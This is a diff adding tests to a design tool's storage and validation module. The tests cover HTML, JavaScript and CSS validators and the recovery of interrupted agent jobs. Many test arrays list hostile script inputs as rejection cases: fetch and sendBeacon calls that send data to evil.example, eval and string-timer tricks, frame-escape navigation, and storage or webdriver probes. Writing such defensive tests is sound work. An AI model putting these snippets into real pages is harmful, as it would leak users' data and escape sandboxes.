@@ -4,10 +4,12 @@ import { tmpdir } from "node:os";
 import { join } from "node:path";
 import test from "node:test";
 import {
+  DESIGN_MAIN_AGENT_QUEUED_MESSAGE,
   DesignRevisionConflictError,
   MAX_DESIGN_ASSET_BYTES,
   MAX_DESIGN_CONTEXT_BYTES,
   assertDesignFrozenContextBudget,
+  cancelDesignJob,
   createDesignJob,
   getDesignCanvas,
   getDesignJob,
@@ -16,19 +18,544 @@ import {
   getDesignVersion,
   importDesignCanvasAssetBatch,
   listDesignAssets,
+  listDesignJobs,
   listDesignVersions,
   publishDesignVersion,
   recoverInterruptedDesignJobs,
+  reserveDesignMainPlanExecution,
   redoDesignCanvas,
   resolveDesignAssetFile,
   resolveDesignVersionFile,
+  resolveDesignVersionPreview,
   storeDesignAsset,
   undoDesignCanvas,
   updateDesignJob,
+  updateDesignThreadMessage,
+  validateDesignExportJavaScript,
+  validateDesignExportCss,
+  validateDesignHtml,
   initializeDesignProject,
   mutateDesignCanvas,
 } from "../src/design/design-storage.ts";
 import { materializeDesignContext } from "../src/design/design-node-agent.ts";
+import type { DesignVersionPublicationPhase } from "../src/design/design-types.ts";
+
+const FIXTURE_JOB_IDENTITY = { runnerId: "fixture", model: null } as const;
+
+async function validatingPublicationFixture(label: string): Promise<{
+  dataDir: string;
+  projectId: string;
+  job: Awaited<ReturnType<typeof createDesignJob>>["job"];
+}> {
+  const dataDir = await mkdtemp(join(tmpdir(), `dezin-design-publication-${label}-`));
+  const projectId = `project-publication-${label}`;
+  await initializeDesignProject(dataDir, projectId);
+  await mutateDesignCanvas(dataDir, projectId, {
+    expectedRevision: 0,
+    intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
+  });
+  const created = await createDesignJob(dataDir, projectId, {
+    kind: "node-generation",
+    ...FIXTURE_JOB_IDENTITY,
+    nodeId: "node-page",
+  });
+  await updateDesignJob(dataDir, projectId, created.job.id, { status: "running" });
+  await updateDesignJob(dataDir, projectId, created.job.id, { status: "validating" });
+  return { dataDir, projectId, job: created.job };
+}
+
+test("Design HTML validation ignores inert navigation words in inline-script comments", () => {
+  assert.doesNotThrow(() => validateDesignHtml(`<!doctype html><html><head></head><body><script>
+    // TOC smooth scroll offset handled by scroll-padding-top; ensure keyboard focus moves
+    document.body.dataset.ready = "yes";
+  </script></body></html>`));
+});
+
+test("Design HTML validation allows locally bound navigation names and ordinary object properties", () => {
+  assert.doesNotThrow(() => validateDesignHtml(`<!doctype html><html><head></head><body><script>
+    const parent = { top: 12, opener: "local" };
+    const top = parent.top;
+    function describe(opener) { return opener + top; }
+    document.body.dataset.value = describe(parent.opener);
+  </script></body></html>`));
+});
+
+test("Design HTML validation allows inert URL and capability text in inline JavaScript", () => {
+  assert.doesNotThrow(() => validateDesignHtml(`<!doctype html><html><head></head><body><script>
+    const copy = "Parent/top/opener notes: https://example.test/reference and /api/examples";
+    document.body.textContent = copy;
+  </script></body></html>`));
+});
+
+test("Design HTML validation rejects active global navigation and remote capabilities", () => {
+  const unsafeScripts = [
+    "parent.postMessage('escape', '*')",
+    "{ const top = 12; } top.location = '#escape'",
+    "opener.close()",
+    "fetch('https://evil.example/data')",
+    "const remote = 'https://evil.example/image.png'; document.body.setAttribute('src', remote)",
+    "window.location.assign('https://evil.example')",
+    "window.open('https://evil.example')",
+    "import('https://evil.example/module.js')",
+    "const broken = ;",
+  ];
+  for (const script of unsafeScripts) {
+    assert.throws(
+      () => validateDesignHtml(`<!doctype html><html><head></head><body><script>${script}</script></body></html>`),
+      /invalid|parent|top|opener|navigation|window|remote/i,
+      script,
+    );
+  }
+});
+
+test("Design HTML validation rejects network capabilities recovered from unknown receivers", () => {
+  const unsafeScripts = [
+    `window.addEventListener("click", (event) => event.view.fetch("https://evil.example/leak"))`,
+    `function leak(receiver) { receiver.fetch("https://evil.example/leak"); }
+     document.addEventListener("click", leak)`,
+    `function leak(receiver) { receiver.fetch?.("https://evil.example/leak"); }
+     document.addEventListener("click", leak)`,
+    `window.addEventListener("click", (event) => {
+       const request = event.view.fetch;
+       request("https://evil.example/leak");
+     })`,
+    `function leak(receiver) { receiver["send" + "Beacon"]("https://evil.example/leak", "secret"); }
+     document.addEventListener("click", leak)`,
+  ];
+  for (const script of unsafeScripts) {
+    assert.throws(
+      () => validateDesignHtml(`<!doctype html><html><head></head><body><script>${script}</script></body></html>`),
+      /remote|network/i,
+      script,
+    );
+  }
+
+  assert.doesNotThrow(() => validateDesignHtml(`<!doctype html><html><head></head><body><script>
+    const localClient = { fetch(value) { return value; }, sendBeacon(value) { return value; } };
+    localClient.fetch("local-state");
+    localClient.sendBeacon("local-state");
+  </script></body></html>`));
+});
+
+test("Design HTML validation rejects aliased and indirect browser capabilities", () => {
+  const unsafeScripts = [
+    "const { fetch: request } = window; request('https://evil.example/x')",
+    "eval('fetch(\"https://evil.example/x\")')",
+    "const image = document.createElement('img'); image.setAttribute(['s', 'rc'].join(''), 'https://evil.example/x')",
+    "navigator.sendBeacon('https://evil.example/x', 'secret')",
+    "const popup = window.open; popup('https://evil.example/x')",
+    "history.pushState({}, '', 'https://evil.example/x')",
+    "const image = document.createElement('img'); Object.assign(image, { src: 'https://evil.example/x' })",
+    "Reflect.set(document.body, 'innerHTML', '<img src=\"https://evil.example/x\">')",
+    "document.body.insertAdjacentHTML('beforeend', '<img src=\"https://evil.example/x\">')",
+    "setTimeout('fetch(\"https://evil.example/x\")', 0)",
+    "window.setTimeout('fetch(\"https://evil.example/x\")', 0)",
+    "let delayed = 'fetch(\"https://evil.example/x\")'; setTimeout(delayed, 0)",
+    "[].filter.constructor('fetch(\"https://evil.example/x\")')()",
+    "this.fetch('https://evil.example/x')",
+    "this.parent.postMessage('escape', '*')",
+    "this.top.location = '#escape'",
+    "this.eval('fetch(\"https://evil.example/x\")')",
+    "const script = document.createElement('script'); script.textContent = 'fetch(\"https://evil.example/x\")'; document.body.append(script)",
+    "const tag = 'scr' + 'ipt'; document.createElement(tag)",
+    "document.body.style.backgroundImage = 'u\\\\72l(https://evil.example/x)'",
+    "document.body.style.cssText = 'background: image-set(\"//evil.example/x\" 1x)'",
+    "document.body.style.setProperty('background-image', 'url(https://evil.example/x)')",
+    "document.styleSheets[0].insertRule('@import \"https://evil.example/x\"')",
+    "document.createElement('a').target = '_blank'",
+    "const global = window.window; global.fetch('https://evil.example/x')",
+    "const global = document.body.ownerDocument.defaultView; global.fetch('https://evil.example/x')",
+  ];
+  for (const script of unsafeScripts) {
+    assert.throws(
+      () => validateDesignHtml(`<!doctype html><html><head></head><body><script>${script}</script></body></html>`),
+      /invalid|navigation|window|parent|top|opener|remote|dynamic|markup|style|asset|external|unpinned/i,
+      script,
+    );
+  }
+});
+
+test("Design HTML validation models parameter and class-static var scopes", () => {
+  const unsafeScripts = [
+    "function load(value = fetch('https://evil.example/x')) { var fetch = () => undefined; return value; } load();",
+    "class Local { static { var fetch = () => undefined; } } fetch('https://evil.example/x');",
+  ];
+  for (const script of unsafeScripts) {
+    assert.throws(
+      () => validateDesignHtml(`<!doctype html><html><head></head><body><script>${script}</script></body></html>`),
+      /remote/i,
+      script,
+    );
+  }
+});
+
+test("Design HTML validation allows read-only capability checks and locally bound names", () => {
+  assert.doesNotThrow(() => validateDesignHtml(`<!doctype html><html><head></head><body><script>
+    const supportsFetch = typeof fetch === "function";
+    const currentRoute = location.pathname + window.location.hash;
+    function render(fetch, history, Function) {
+      history.pushState({}, "", "local");
+      return Function(fetch());
+    }
+    function refresh() { document.body.dataset.refreshed = "yes"; }
+    setTimeout(refresh, 0);
+    window.setTimeout(() => document.body.dataset.later = "yes", 0);
+    document.body.dataset.summary = String(supportsFetch) + currentRoute + typeof render;
+  </script></body></html>`));
+});
+
+test("Design HTML validation accepts stable callable timer callbacks and rejects reassigned callbacks", () => {
+  assert.doesNotThrow(() => validateDesignHtml(`<!doctype html><html><head></head><body><script>
+    let refresh = () => { document.body.dataset.refreshed = "yes"; };
+    var tick = function () { document.body.dataset.ticked = "yes"; };
+    const controller = { settle() { document.body.dataset.settled = "yes"; } };
+    setTimeout(refresh, 0);
+    window.setInterval(tick, 1000);
+    setTimeout(controller.settle, 0);
+  </script></body></html>`));
+
+  assert.throws(
+    () => validateDesignHtml(`<!doctype html><html><head></head><body><script>
+      let callback = () => undefined;
+      callback = "not callable";
+      setTimeout(callback, 0);
+    </script></body></html>`),
+    /dynamic/i,
+  );
+});
+
+test("Design Export JavaScript rejects deferred timers and schedulers without changing Node HTML", () => {
+  const deferredScripts = [
+    "setTimeout(() => document.body.replaceChildren(), 1)",
+    "window.setInterval(() => document.body.replaceChildren(), 1)",
+    "requestAnimationFrame(() => document.body.replaceChildren())",
+    "globalThis.requestIdleCallback?.(() => document.body.replaceChildren())",
+    "queueMicrotask(() => document.body.replaceChildren())",
+  ];
+
+  for (const script of deferredScripts) {
+    assert.throws(
+      () => validateDesignExportJavaScript(script),
+      /timer|scheduler|deferred/i,
+      script,
+    );
+  }
+
+  assert.doesNotThrow(() => validateDesignExportJavaScript(`
+    const localClock = { setTimeout(callback) { callback(); } };
+    let ready = false;
+    localClock.setTimeout(() => { ready = true; });
+    document.body.dataset.ready = String(ready);
+  `));
+
+  assert.doesNotThrow(() => validateDesignHtml(`<!doctype html><html><head></head><body><script>
+    requestAnimationFrame(() => document.body.dataset.ready = "yes");
+  </script></body></html>`));
+});
+
+test("Design Export validation rejects browser-state probes and Web Animations", () => {
+  const unsafeScripts = [
+    "if (navigator.webdriver) document.body.textContent = 'validation-only'",
+    "if (window.name) document.body.textContent = window.name",
+    "if (screen.width > 0) document.body.dataset.gate = 'screen'",
+    "document.body.dataset.dpr = String(devicePixelRatio)",
+    "if (matchMedia('(display-mode: browser)').matches) document.body.dataset.gate = 'media'",
+    "const prior = localStorage.getItem('visited'); document.body.dataset.prior = String(prior)",
+    "window.sessionStorage.setItem('visited', 'yes')",
+    "indexedDB.open('visual-gate')",
+    "globalThis.caches.match('/validation-state')",
+    "document.cookie = 'gate=seen'",
+    "Reflect.get(window, 'navigator').webdriver",
+    "Object.getOwnPropertyDescriptor(window, 'localStorage')?.get?.call(window)",
+    "document.body.animate([{ opacity: 0 }, { opacity: 1 }], { delay: 60_000 })",
+    "new KeyframeEffect(document.body, [{ opacity: 0 }, { opacity: 1 }])",
+    "document.createElementNS('http://www.w3.org/2000/svg', 'animate')",
+    "document.createElementNS('http://www.w3.org/2000/svg', 'set')",
+    "document.body.style.setProperty('animation', 'swap 1ms 60s forwards')",
+    "document.body.style.cssText = 'transition: opacity 1ms 60s'",
+    "document.styleSheets[0]?.insertRule('@keyframes swap { to { opacity: 0 } }')",
+    "document.body.setAttribute('style', unknownCss)",
+    "document.body.style.setProperty('color', unknownColor)",
+    "document.styleSheets[0]?.insertRule(unknownRule)",
+  ];
+  for (const script of unsafeScripts) {
+    assert.throws(
+      () => validateDesignExportJavaScript(script),
+      /environment|storage|animation|deferred/i,
+      script,
+    );
+  }
+
+  assert.doesNotThrow(() => validateDesignExportJavaScript(`
+    const localState = { navigator: "copy", localStorage: new Map(), animate(value) { return value; } };
+    document.body.dataset.copy = localState.navigator;
+  `));
+});
+
+test("Design Export state validation permits local presentation-record destructuring without weakening global probes", () => {
+  const localPresentationRecords = [
+    `const swatches = [{ name: "Ink", value: "#111" }];
+     for (const { name, value } of swatches) {
+       const row = document.createElement("div");
+       row.textContent = name + value;
+       document.body.append(row);
+     }`,
+    `const swatches = [{ name: "Ink", value: "#111" }];
+     swatches.forEach(({ name, value }) => {
+       const row = document.createElement("div");
+       row.textContent = name + value;
+       document.body.append(row);
+     });`,
+    `const swatches = [{ name: "Ink", value: "#111" }];
+     for (const swatch of swatches) {
+       const row = document.createElement("div");
+       row.textContent = swatch.name + swatch.value;
+       document.body.append(row);
+     }`,
+    `const swatches = [{ name: "Ink" }];
+     swatches.forEach((swatch) => {
+       const row = document.createElement("div");
+       row.textContent = swatch.name;
+       document.body.append(row);
+     });`,
+  ];
+  for (const source of localPresentationRecords) {
+    assert.doesNotThrow(() => validateDesignExportJavaScript(source), source);
+  }
+
+  for (const source of [
+    `const { name } = window; document.body.textContent = name;`,
+    `const { localStorage } = globalThis; document.body.textContent = String(localStorage.length);`,
+  ]) {
+    assert.throws(() => validateDesignExportJavaScript(source), /remote|environment|storage/i, source);
+  }
+});
+
+test("Design Export CSS rejects animations, transitions, and timeline-delayed changes", () => {
+  const unsafeCss = [
+    ".gate { animation: swap 1ms 60s forwards } @keyframes swap { to { opacity: 0 } }",
+    ".gate { transition-property: opacity; transition-delay: 60s }",
+    ".gate { \\61nimation-name: swap }",
+    ".gate { view-timeline-name: --gate }",
+    "@starting-style { .gate { opacity: 0 } }",
+  ];
+  for (const css of unsafeCss) {
+    assert.throws(
+      () => validateDesignExportCss(css),
+      /animation|transition|timeline|deferred/i,
+      css,
+    );
+  }
+
+  assert.doesNotThrow(() => validateDesignExportCss(`
+    .static-card { opacity: 1; transform: translateX(0); }
+    .static-card::before { content: "animation: prose only"; }
+  `));
+});
+
+test("Design Export capability scanning ignores TypeScript type-space but keeps runtime casts active", () => {
+  assert.doesNotThrow(() => validateDesignExportJavaScript(`
+    type Swatch = { name: string; performance?: string };
+    const swatch: Swatch = { name: "Ink" };
+    document.body.textContent = swatch.name;
+  `));
+  assert.throws(() => validateDesignExportJavaScript(`
+    document.body.textContent = (navigator as unknown as { name: string }).name;
+  `), /remote|environment|storage/i);
+});
+
+test("Design Export proves finite local URL loops and invalidates mutated collections", () => {
+  for (const source of [
+    `const links: Array<[string, string]> = [["One", "#one"], ["Two", "/two"]];
+     for (const [label, href] of links) {
+       const anchor = document.createElement("a");
+       anchor.href = href;
+       anchor.textContent = label;
+       document.body.append(anchor);
+     }`,
+    `for (const [label, href] of [["One", "#one"], ["Two", "/two"]] as Array<[string, string]>) {
+       const anchor = document.createElement("a");
+       anchor.href = href;
+       anchor.textContent = label;
+       document.body.append(anchor);
+     }`,
+    `function appendLinks(links: Array<[string, string]>): void {
+       for (const [label, href] of links) {
+         const anchor = document.createElement("a");
+         anchor.href = href;
+         anchor.textContent = label;
+         document.body.append(anchor);
+       }
+     }
+     appendLinks([["One", "#one"], ["Two", "/two"]]);`,
+    `type Story = { href: string; title: string };
+     const stories: Story[] = [{ href: "#one", title: "One" }, { href: "/two", title: "Two" }];
+     for (const story of stories.slice(0, 2)) {
+       const anchor = document.createElement("a");
+       anchor.href = story.href;
+       anchor.textContent = story.title;
+       document.body.append(anchor);
+     }`,
+    `const notes = ["Label — detail"];
+     for (const note of notes) document.body.append(note.split(" — ")[0]!);`,
+  ]) {
+    assert.doesNotThrow(() => validateDesignExportJavaScript(source), source);
+  }
+
+  for (const source of [
+    `const links: Array<[string, string]> = [["Bad", "https://evil.example/x"]];
+     for (const [, href] of links) document.createElement("a").href = href;`,
+    `const links: Array<[string, string]> = [["One", "#one"]];
+     links.push(["Bad", "https://evil.example/x"]);
+     for (const [, href] of links) document.createElement("a").href = href;`,
+    `type Story = { href: string };
+     const stories: Story[] = [{ href: "#one" }, { href: "https://evil.example/x" }];
+     for (const story of stories.slice(0, 2)) document.createElement("a").href = story.href;`,
+  ]) {
+    assert.throws(() => validateDesignExportJavaScript(source), /remote/i, source);
+  }
+});
+
+test("Design Export preserves stable provenance through minified var and let syntax", () => {
+  assert.doesNotThrow(() => validateDesignExportJavaScript(`
+    var storyHref = "#stories";
+    var swatches = [{ name: "Ink", hex: "#111" }, { name: "Paper", hex: "#fff" }];
+    for (let swatch of swatches) {
+      const anchor = document.createElement("a");
+      anchor.href = storyHref;
+      anchor.textContent = swatch.name + swatch.hex;
+      document.body.append(anchor);
+    }
+  `));
+
+  for (const source of [
+    `var storyHref = "#stories"; storyHref = "https://evil.example/x";
+     document.createElement("a").href = storyHref;`,
+    `var storyHref = "https://evil.example/x"; document.createElement("a").href = storyHref;
+     var storyHref = "#stories";`,
+    `var swatches = [{ name: "Ink" }];
+     for (let swatch of swatches) { swatch = window; document.body.textContent = swatch.name; }`,
+    `const state = {}; Object.assign(state, unknownExternalState);`,
+  ]) {
+    assert.throws(() => validateDesignExportJavaScript(source), /remote|environment|storage/i, source);
+  }
+});
+
+test("Design Export rejects generic DOM factories whose tag and attribute names are not statically bounded", () => {
+  assert.throws(() => validateDesignExportJavaScript(`
+    function el(tag: string, attrs: Record<string, string>): HTMLElement {
+      const node = document.createElement(tag);
+      for (const key in attrs) node.setAttribute(key, attrs[key]!);
+      return node;
+    }
+    document.body.append(el("main", { class: "shell" }));
+  `), /markup|remote/i);
+
+  assert.doesNotThrow(() => validateDesignExportJavaScript(`
+    const node = document.createElement("main");
+    node.setAttribute("class", "shell");
+    document.body.append(node);
+  `));
+});
+
+test("Design HTML validation permits only self-targeting indirect DOM writes", () => {
+  assert.doesNotThrow(() => validateDesignHtml(`<!doctype html><html><head></head><body><script>
+    const link = document.createElement("a");
+    const submit = document.createElement("button");
+    Reflect.set(link, "target", "_self");
+    Object.defineProperty(submit, "formTarget", { value: "_self" });
+    Object.assign(link, { target: "_self" });
+  </script></body></html>`));
+
+  const unsafeScripts = [
+    `const link = document.createElement("a"); Reflect.set(link, "target", "named-context");`,
+    `const link = document.createElement("a"); Object.defineProperty(link, "target", { value: "named-context" });`,
+    `const submit = document.createElement("button"); Object.assign(submit, { formTarget: "named-context" });`,
+  ];
+  for (const script of unsafeScripts) {
+    assert.throws(
+      () => validateDesignHtml(`<!doctype html><html><head></head><body><script>${script}</script></body></html>`),
+      /window/i,
+      script,
+    );
+  }
+});
+
+test("Design HTML validation keeps ordinary local state and typed DOM updates usable", () => {
+  assert.doesNotThrow(() => validateDesignHtml(`<!doctype html><html><head></head><body><script>
+    const state = { count: 0 };
+    const key = "count";
+    const patch = { ready: true };
+    state[key] = 1;
+    Object.assign(state, patch);
+    const localWriter = { write(value) { state.value = value; } };
+    localWriter.write("safe");
+    const localAttributes = { setAttribute(name, value) { state[name] = value; } };
+    localAttributes.setAttribute(key, "safe");
+    const tagName = "div";
+    const node = document.createElement(tagName);
+    const ariaName = "aria-live";
+    node.setAttribute(ariaName, "polite");
+    node.style.setProperty("opacity", "0.5");
+    document.body.append(node);
+  </script></body></html>`));
+});
+
+test("Design HTML validation proves local helper parameters and class receivers without trusting DOM receivers", () => {
+  assert.doesNotThrow(() => validateDesignHtml(`<!doctype html><html><head></head><body><script>
+    function updateLocalState(state, key, value) { state[key] = value; }
+    updateLocalState({ count: 0 }, "count", 1);
+    class Store {
+      constructor() { this.state = {}; }
+      update(key, value) { this.state[key] = value; }
+    }
+    const store = new Store();
+    store.update("ready", true);
+  </script></body></html>`));
+
+  const unsafeScripts = [
+    `function update(receiver, key, value) { receiver[key] = value; }
+     update(document.body, "innerHTML", "<strong>replace</strong>");`,
+    `class Store { update(key, value) { this[key] = value; } }
+     const store = new Store();
+     store.update.call(document.body, "innerHTML", "<strong>replace</strong>");`,
+  ];
+  for (const script of unsafeScripts) {
+    assert.throws(
+      () => validateDesignHtml(`<!doctype html><html><head></head><body><script>${script}</script></body></html>`),
+      /remote|markup/i,
+      script,
+    );
+  }
+});
+
+test("Design HTML validation tokenizes script elements and ignores inert data blocks", () => {
+  assert.doesNotThrow(() => validateDesignHtml(`<!doctype html><html><head>
+    <script type="application/ld+json">{"name":"A > B"}</script>
+    <script type="text/plain">not valid = JavaScript > still inert</script>
+  </head><body><script data-note="1 > 0">
+    document.body.dataset.ready = "yes";
+  </script></body></html>`));
+  assert.throws(
+    () => validateDesignHtml(`<!doctype html><html><head><script type="application/json">{broken</script></head><body></body></html>`),
+    /JSON|data/i,
+  );
+});
+
+test("Design HTML validation rejects executable HTML attributes and nested browsing contexts", () => {
+  const unsafeDocuments = [
+    `<!doctype html><html><head></head><body onload="fetch('https://evil.example/x')"></body></html>`,
+    `<!doctype html><html><head><script type="speculationrules">{"prefetch":[{"urls":["https://evil.example/x"]}]}</script></head><body></body></html>`,
+    `<!doctype html><html><head></head><body><iframe srcdoc="<script>fetch('https://evil.example/x')</script>"></iframe></body></html>`,
+    `<!doctype html><html><head></head><body><a href="#safe" target="_blank">Open</a></body></html>`,
+    `<!doctype html><html><head></head><body><form><button formtarget="named-window">Send</button></form></body></html>`,
+    `<!doctype html><html><head><style>body{background:u\\72l(https://evil.example/x)}</style></head><body></body></html>`,
+    `<!doctype html><html><head><style>body{background:image-set("//evil.example/x" 1x)}</style></head><body></body></html>`,
+  ];
+  for (const html of unsafeDocuments) {
+    assert.throws(() => validateDesignHtml(html), /event|script|browsing|remote|invalid|style|asset|external|unpinned/i, html);
+  }
+});
 
 test("a Design project starts as an empty revisioned canvas and mutations use CAS", async () => {
   const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-storage-"));
@@ -67,7 +594,7 @@ test("a Design project starts as an empty revisioned canvas and mutations use CA
     assert.equal(reloaded.revision, 1);
     assert.equal(reloaded.nodes[0]?.id, "node-page");
     const projectJson = JSON.parse(await readFile(join(dataDir, "projects", projectId, "design", "project.json"), "utf8"));
-    assert.equal(projectJson.schemaVersion, 1);
+    assert.equal(projectJson.schemaVersion, 2);
     assert.equal(projectJson.nodes[0].id, "node-page");
     await assert.rejects(readFile(join(dataDir, "projects", projectId, "design", "nodes", "node-page", "node.json")));
   } finally {
@@ -109,6 +636,7 @@ test("restart recovery durably cancels interrupted Jobs without rolling back a g
     });
     const created = await createDesignJob(dataDir, projectId, {
       kind: "node-generation",
+      ...FIXTURE_JOB_IDENTITY,
       nodeId: "node-page",
     });
     await updateDesignJob(dataDir, projectId, created.job.id, { status: "running" });
@@ -130,6 +658,222 @@ test("restart recovery durably cancels interrupted Jobs without rolling back a g
   }
 });
 
+test("restart recovery replaces interrupted Main Agent reservations in place and is idempotent", async () => {
+  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-main-thread-recovery-"));
+  const projectId = "project-main-thread-recovery";
+  try {
+    await initializeDesignProject(dataDir, projectId);
+    const queued = await createDesignJob(dataDir, projectId, {
+      kind: "main-agent",
+      ...FIXTURE_JOB_IDENTITY,
+      reserveMainThreadTurn: {
+        userContent: "Create the foundation",
+        assistantContent: "Main Agent orchestration is queued. The final result will replace this status.",
+      },
+    }, 100);
+    const running = await createDesignJob(dataDir, projectId, {
+      kind: "main-agent",
+      ...FIXTURE_JOB_IDENTITY,
+      reserveMainThreadTurn: {
+        userContent: "Create the detail view",
+        assistantContent: "Main Agent orchestration is queued. The final result will replace this status.",
+      },
+    }, 101);
+    await updateDesignJob(dataDir, projectId, running.job.id, { status: "running" }, 102);
+    const before = await getDesignThread(dataDir, projectId, { type: "main" });
+    assert.equal(before.messages.length, 4);
+
+    const recovered = await recoverInterruptedDesignJobs(dataDir, projectId, 200);
+    assert.deepEqual(
+      recovered.map((job) => job.id).sort(),
+      [queued.job.id, running.job.id].sort(),
+    );
+    const after = await getDesignThread(dataDir, projectId, { type: "main" });
+    assert.equal(after.messages.length, before.messages.length);
+    assert.deepEqual(
+      after.messages.filter((message) => message.role === "user").map((message) => message.content),
+      ["Create the foundation", "Create the detail view"],
+    );
+    for (const jobId of [queued.job.id, running.job.id]) {
+      const assistant = after.messages.find((message) => message.role === "assistant" && message.jobId === jobId);
+      assert.match(assistant?.content ?? "", /interrupted by daemon restart and cancelled/i);
+      const job = await getDesignJob(dataDir, projectId, jobId);
+      assert.equal(job.status, "cancelled");
+      assert.match(job.error ?? "", /interrupted by daemon restart/i);
+    }
+
+    assert.deepEqual(await recoverInterruptedDesignJobs(dataDir, projectId, 300), []);
+    assert.deepEqual(await getDesignThread(dataDir, projectId, { type: "main" }), after);
+  } finally {
+    await rm(dataDir, { recursive: true, force: true });
+  }
+});
+
+test("restart recovery projects terminal Main Jobs whose placeholder write was interrupted", async () => {
+  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-main-terminal-thread-recovery-"));
+  const projectId = "project-main-terminal-thread-recovery";
+  try {
+    await initializeDesignProject(dataDir, projectId);
+    const failed = await createDesignJob(dataDir, projectId, {
+      kind: "main-agent",
+      ...FIXTURE_JOB_IDENTITY,
+      reserveMainThreadTurn: {
+        userContent: "Fail after the terminal Job write",
+        assistantContent: DESIGN_MAIN_AGENT_QUEUED_MESSAGE,
+      },
+    }, 100);
+    assert.ok(failed.mainThreadReservation);
+    await updateDesignJob(dataDir, projectId, failed.job.id, { status: "running" }, 101);
+    await updateDesignThreadMessage(dataDir, projectId, { type: "main" }, failed.mainThreadReservation!.assistantMessageId, {
+      content: "A success-looking reply persisted before the failure.",
+      expectedRole: "assistant",
+      expectedJobId: failed.job.id,
+    }, 102);
+    await updateDesignJob(dataDir, projectId, failed.job.id, {
+      status: "failed",
+      error: "terminal Job persisted before its thread projection",
+    }, 103);
+    const cancelled = await createDesignJob(dataDir, projectId, {
+      kind: "main-agent",
+      ...FIXTURE_JOB_IDENTITY,
+      reserveMainThreadTurn: {
+        userContent: "Cancel after the terminal Job write",
+        assistantContent: DESIGN_MAIN_AGENT_QUEUED_MESSAGE,
+      },
+    }, 104);
+    assert.ok(cancelled.mainThreadReservation);
+    await updateDesignThreadMessage(
+      dataDir,
+      projectId,
+      { type: "main" },
+      cancelled.mainThreadReservation!.assistantMessageId,
+      {
+        content: "A progress reply persisted before cancellation.",
+        expectedRole: "assistant",
+        expectedJobId: cancelled.job.id,
+      },
+      105,
+    );
+    await updateDesignJob(dataDir, projectId, cancelled.job.id, {
+      status: "cancelled",
+      error: "Main Agent turn cancelled",
+    }, 106);
+    const before = await getDesignThread(dataDir, projectId, { type: "main" });
+    assert.equal(before.messages.filter((message) => message.content === DESIGN_MAIN_AGENT_QUEUED_MESSAGE).length, 0);
+
+    assert.deepEqual(await recoverInterruptedDesignJobs(dataDir, projectId, 200), []);
+    const after = await getDesignThread(dataDir, projectId, { type: "main" });
+    assert.equal(after.messages.length, before.messages.length);
+    assert.match(
+      after.messages.find((message) => message.role === "assistant" && message.jobId === failed.job.id)?.content ?? "",
+      /Main Agent failed: terminal Job persisted before its thread projection/i,
+    );
+    assert.equal(
+      after.messages.find((message) => message.role === "assistant" && message.jobId === cancelled.job.id)?.content,
+      "Main Agent orchestration cancelled.",
+    );
+    assert.deepEqual(await recoverInterruptedDesignJobs(dataDir, projectId, 300), []);
+    assert.deepEqual(await getDesignThread(dataDir, projectId, { type: "main" }), after);
+  } finally {
+    await rm(dataDir, { recursive: true, force: true });
+  }
+});
+
+test("restart recovery replaces a Main success reply written before its terminal Job transition", async () => {
+  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-main-reply-before-job-"));
+  const projectId = "project-main-reply-before-job";
+  try {
+    await initializeDesignProject(dataDir, projectId);
+    const created = await createDesignJob(dataDir, projectId, {
+      kind: "main-agent",
+      ...FIXTURE_JOB_IDENTITY,
+      reserveMainThreadTurn: {
+        userContent: "Complete, then crash before terminalizing the Job",
+        assistantContent: DESIGN_MAIN_AGENT_QUEUED_MESSAGE,
+      },
+    }, 100);
+    assert.ok(created.mainThreadReservation);
+    await updateDesignJob(dataDir, projectId, created.job.id, { status: "running" }, 101);
+    await updateDesignThreadMessage(
+      dataDir,
+      projectId,
+      { type: "main" },
+      created.mainThreadReservation!.assistantMessageId,
+      {
+        content: "Everything completed successfully.",
+        expectedRole: "assistant",
+        expectedJobId: created.job.id,
+      },
+      102,
+    );
+
+    const recovered = await recoverInterruptedDesignJobs(dataDir, projectId, 200);
+    assert.equal(recovered.find((job) => job.id === created.job.id)?.status, "cancelled");
+    const thread = await getDesignThread(dataDir, projectId, { type: "main" });
+    assert.equal(thread.messages.length, 2);
+    assert.match(thread.messages[1]?.content ?? "", /interrupted by daemon restart and cancelled/i);
+    assert.equal((await getDesignJob(dataDir, projectId, created.job.id)).status, "cancelled");
+    assert.deepEqual(await recoverInterruptedDesignJobs(dataDir, projectId, 300), []);
+    assert.deepEqual(await getDesignThread(dataDir, projectId, { type: "main" }), thread);
+  } finally {
+    await rm(dataDir, { recursive: true, force: true });
+  }
+});
+
+test("restart recovery re-projects terminal Jobs whose Canvas ownership write was interrupted", async () => {
+  const cases = [
+    { status: "failed", kind: "node-generation", nodeKind: "page", error: "simulated terminal failure" },
+    { status: "cancelled", kind: "node-generation", nodeKind: "page", error: "Agent turn cancelled" },
+    { status: "ready", kind: "node-analysis", nodeKind: "image", error: null },
+  ] as const;
+  for (const [index, scenario] of cases.entries()) {
+    const dataDir = await mkdtemp(join(tmpdir(), `dezin-design-terminal-projection-${scenario.status}-`));
+    const projectId = `project-terminal-projection-${scenario.status}`;
+    try {
+      await initializeDesignProject(dataDir, projectId);
+      await mutateDesignCanvas(dataDir, projectId, {
+        expectedRevision: 0,
+        intents: [{ type: "add-node", node: { id: "node-target", kind: scenario.nodeKind } }],
+      });
+      const created = await createDesignJob(dataDir, projectId, {
+        kind: scenario.kind,
+        ...FIXTURE_JOB_IDENTITY,
+        nodeId: "node-target",
+      }, 100 + index);
+      const jobPath = join(dataDir, "projects", projectId, "design", "jobs", `${created.job.id}.json`);
+      const terminalJob = JSON.parse(await readFile(jobPath, "utf8"));
+      terminalJob.status = scenario.status;
+      terminalJob.error = scenario.error;
+      terminalJob.cancelRequested = scenario.status === "cancelled";
+      terminalJob.updatedAt = 200 + index;
+      terminalJob.finishedAt = 200 + index;
+      await writeFile(jobPath, `${JSON.stringify(terminalJob, null, 2)}\n`);
+
+      const stranded = await getDesignCanvas(dataDir, projectId);
+      assert.equal(stranded.nodes[0]?.activeJobId, created.job.id);
+      assert.equal(stranded.nodes[0]?.state, "queued");
+
+      const recovered = await recoverInterruptedDesignJobs(dataDir, projectId, 300 + index);
+      assert.equal(recovered.find((job) => job.id === created.job.id)?.status, scenario.status);
+      const repaired = await getDesignCanvas(dataDir, projectId);
+      assert.equal(repaired.nodes[0]?.activeJobId, null);
